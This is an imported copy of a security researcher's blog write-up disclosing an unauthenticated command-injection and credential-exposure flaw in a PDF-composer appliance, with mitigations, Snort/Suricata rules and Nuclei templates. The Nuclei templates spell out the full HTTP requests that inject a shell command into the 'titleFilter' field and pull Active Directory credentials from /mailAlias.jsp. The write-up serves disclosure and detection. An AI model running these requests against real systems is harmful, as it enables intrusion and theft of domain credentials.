---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-01-14_yafpc-unauthenticated-remote-code-execution.md
original_filename: 2023-01-14_yafpc-unauthenticated-remote-code-execution.md
title: YAFPC — Unauthenticated Remote Code Execution
category: documents
detected_topics:
- command-injection
- access-control
- sso
- automation-abuse
- api-security
- cloud-security
tags:
- imported
- documents
- command-injection
- access-control
- sso
- automation-abuse
- api-security
- cloud-security
language: en
raw_sha256: 2f57f2953a81975ea157949921eafa9a63a78e6b35249cd10517963b0863acae
text_sha256: f5175cabb668f485f9a17c261d397d8fef3a168863618be15ced6630be2ccfda
ingested_at: '2026-06-28T07:32:17Z'
sensitivity: unknown
redactions_applied: false
---

# YAFPC — Unauthenticated Remote Code Execution

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-01-14_yafpc-unauthenticated-remote-code-execution.md
- Source Type: markdown
- Detected Topics: command-injection, access-control, sso, automation-abuse, api-security, cloud-security
- Ingested At: 2026-06-28T07:32:17Z
- Redactions Applied: False
- Raw SHA256: `2f57f2953a81975ea157949921eafa9a63a78e6b35249cd10517963b0863acae`
- Text SHA256: `f5175cabb668f485f9a17c261d397d8fef3a168863618be15ced6630be2ccfda`


## Content

---
title: "YAFPC — Unauthenticated Remote Code Execution"
url: "https://blog.paradoxis.nl/yafpc-unauthenticated-remote-code-execution-755bf9e4d7c1"
authors: ["Luke Paris"]
bugs: ["Authentication bypass", "Hardcoded credentials", "RCE"]
publication_date: "2023-01-14"
added_date: "2023-02-16"
source: "pentester.land/writeups.json"
original_index: 1673
scraped_via: "browseros"
---

# YAFPC — Unauthenticated Remote Code Execution

YAFPC — Unauthenticated Remote Code Execution
Luke Paris
Follow
6 min read
·
Jan 14, 2023

5

TL;DR:

Two separate flaws exist in the YAFPC (Yet Another Free PDF Composer) appliance which allows an attacker to gain remote code execution, as well as obtain Active Directory (AD) domain credentials without prior authentication or authorization.

The vulnerability is caused due to access controls only being present on the frontend of the application, allowing an attacker to directly call the affected web pages in order to obtain full remote code execution.

An attacker can obtain code execution with full root privileges and obtain access to an Active Directory service account. As the system is running Unix, an attacker could use it as a staging ground for attacks which require access to reserved system ports, as well as simply serve as an easy way of gaining access to otherwise inaccessible network segments.

Steps on how to mitigate, identify the issue and detect vulnerabilities can be found at the end of this post.

A little bit of context

A few months ago I was tasked to perform an internal penetration test at a customer when my (unnamed) colleague and I ran into an interesting appliance meant for creating, printing, and sending PDF documents.

Immediately upon opening the application in a web browser, my Spidey senses started tingling, as just the layout of the application alone screamed “this has to be vulnerable”. So, with some extra time left on the job, we started digging.

Press enter or click to view image in full size
YAFPC — Yet Another Free PDF Composer (the name is quite ironic, as the software is not free)
The “Authentication Bypass”

Of course, the first thing we tried to do is get around the login screen. There were a few links on the side which showed some available functionality, so of course we tried the ‘Admin Settings’ first. Upon clicking the link we were ever so briefly shown the entire admin panel before the login screen popped into view once more. Intrigued by this, we decided to look at the HTTP traffic, and to our surprise:

The admin password!

As it turns out, there wasn’t any authentication to begin with. All the application does, is set a cookie which prevents the login screen from popping up with JavaScript. The server side doesn’t actually check if you’re logged in in the slightest, except for when you’re obtaining the cookie.

So we just copied the administrator password to hide the popup (or we could have just disabled the check using Burp’s find/replace function), and started clicking all links to see what the application had to offer, which lead us to the next discovery:

Active Directory Credential Exposure

Simply by visiting the /mailAlias.jsp page we stumbled upon another set of credentials. This time however, the credentials were a little more impactful given that they were Active Directory service account credentials.

Press enter or click to view image in full size
Free AD credentials!
Obtaining Remote Code Execution

While I personally stopped looking here, my colleague decided to dig even deeper and discovered a cool feature which allows for custom ‘filters’ to be added when printing a document. And what better way to do this than by passing them to the shell directly?

So he added a couple of evil commands, wrapped both the stdin, and stdout in base 64 encoding to ensure commands arrived safely, triggered the function, and got remote code execution!

Press enter or click to view image in full size
Successfully triggering remote code execution
The attacker’s perspective
Mitigation, Exploit Detection & Identification

Unfortunately, the vendor of the application appears to have ceased operations years ago. Despite various attempts to find contact details, I was unable to find a working e-mail address of the original developers, and all web pages and e-mail addresses end up in a dead end. For this reason, I deem it unlikely that there will ever be an official patch.

Get Luke Paris’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Regardless, there are still some things you can do in order to protect yourself, and your organization in the event you use this software:

Mitigation

Firstly, block inbound traffic to TCP port 80 using a network firewall, or place the appliance in a VLAN which is only accessible by select users which require access.

Secondly, place the application behind a web application firewall (WAF) and block inbound HTTP POST requests containing the following form fields, where titleFiltercontains the command injection payload:

formName
jpegDensity
titleAsFilename
useTitleFilter
titleTest
titleFilter

This should completely block any attempts to exploit the device. Lastly, block access to the following URI’s to prevent credential exposure (note that this will break existing functionality for legitimate users):

/mailAlias.jsp Which exposes the AD service account password;
/admin.jsp Which exposes the web UI password (which might be re-used in your organization);
/editPrinter.jsp Which triggers the remote code execution.
Exploit Detection

My colleagues over at the Fox-IT Security Research Team were also kind enough to create a set of detection rules which should help detect attempted, and successful exploits of the appliance (the rules are compatible with both Suricata and Snort):

alert tcp any any -> any $HTTP_PORTS (msg:"FOX-SRT - Flowbit - Possible YAFPC RCE Attempt Observed"; flow:established, to_server; content:"POST"; http_method; uricontent:"/editPrinter.jsp"; content:"|22|titleFilter|22 0d 0a 0d 0a|"; fast_pattern; pcre:"/[a-z0-9]{3,250}--/Ri"; flowbits:set, fox.yafpc.rce; flowbits:noalert; classtype:web-application-attack; metadata:created_at 2022-09-14; priority:3; sid:21004234; rev:1;)

alert tcp any $HTTP_PORTS -> any any (msg:"FOX-SRT - Exploit - Possible YAFPC Successful RCE Observed"; flow:established, from_server; flowbits:isset, fox.yafpc.rce; content:"200"; http_stat_code; content:"<font color=|22|green|22|>"; fast_pattern; threshold:type limit, track by_src, count 1, seconds 600; classtype:web-application-attack; metadata:ids suricata; metadata:created_at 2022-09-14; priority:2; sid:21004235; rev:1;)
Identification

Lastly, I created a set of Nuclei templates which should help in identifying the active directory credential exposure, as well as identifying the remote code execution vulnerability:

id: yafpc-credential-exposure

info:
  name: YAFPC Unauthenticated Domain Credential Exposure
  description: |
  The YAFPC application exposes two endpoints which are used
  for configuring the admin account, as well as an e-mail alias
  in the event the printer needs to send out the PDF documents
  over e-mail.

  Upon requesting the web pages, the application will return the
  credentials for the associated accounts. For the case of the
  e-mail alias, this means an Active Directory service account
  is exposed, which might be used for lateral movement.

  author: github.com/paradoxis
  severity: medium
  tags:
  - yafpc
  - exposure

requests:
  - method: GET
  path:
  - '{{BaseURL}}/mailAlias.jsp'
  matchers-condition: and
  matchers:
  - type: status
  status:
  - 200
  - type: word
  words:
  - 'LDAP Server/Domain Controller:'
  - type: regex
  regex:
  - type=text name="ldapUser" size="30" value="(.*?)">
  - type: regex
  regex:
  - type=password name="ldapPasswd" size="15" value="(.*?)">
id: yafpc-unauth-rce

info:
  name: YAFPC Unauthenticated Remote Code Execution
  description: |
  A vulnerability in the application allows an attacker to execute
  arbitrary commands on the target machine. This is achieved by abusing the
  'Apply filter' functionality of the 'Edit printer' page under 'Printers'.

  By simply adding a command (eg 'id') and pressing 'Test', the application will
  execute the command. While the web GUI shows a login prompt, this can be performed
  without prior authentication.

  author: github.com/paradoxis
  severity: high
  tags:
  - yafpc
  - rce

requests:
  - method: POST
  path:
  - '{{BaseURL}}/printers.jsp'
  headers:
  Connection: close
  Content-Type: 'multipart/form-data; boundary={{randstr_1}}'
  body: |
  --{{randstr_1}}
  Content-Disposition: form-data; name="formName"

  editPrinter
  --{{randstr_1}}
  Content-Disposition: form-data; name="printerHash"

  1660683987610
  --{{randstr_1}}
  Content-Disposition: form-data; name="printerName"

  newPDF-Printer
  --{{randstr_1}}
  Content-Disposition: form-data; name="printerRemark"

  Place Your Remarks here
  --{{randstr_1}}
  Content-Disposition: form-data; name="printerDocs"

  0
  --{{randstr_1}}
  Content-Disposition: form-data; name="action"

  Edit Printer
  --{{randstr_1}}--

  - method: POST
  path:
  - '{{BaseURL}}/editPrinter.jsp'
  headers:
  Connection: close
  Content-Type: 'multipart/form-data; boundary={{randstr_1}}'
  body: |
  --{{randstr_1}}
  Content-Disposition: form-data; name="formName"

  printerProperties
  --{{randstr_1}}
  Content-Disposition: form-data; name="jpegDensity"

  75
  --{{randstr_1}}
  Content-Disposition: form-data; name="titleAsFilename"

  true
  --{{randstr_1}}
  Content-Disposition: form-data; name="useTitleFilter"

  true
  --{{randstr_1}}
  Content-Disposition: form-data; name="titleFilter"

  id
  --{{randstr_1}}
  Content-Disposition: form-data; name="titleTest"

  Test
  --{{randstr_1}}--
  matchers-condition: and
  matchers:
  - type: status
  status:
  - 200
  - type: regex
  regex:
  - <font color="green">uid=\d+.*? gid=\d+.*? groups=\d+.*?</font>
Press enter or click to view image in full size
Using Nuclei to discover the credential exposure and RCE vulnerability
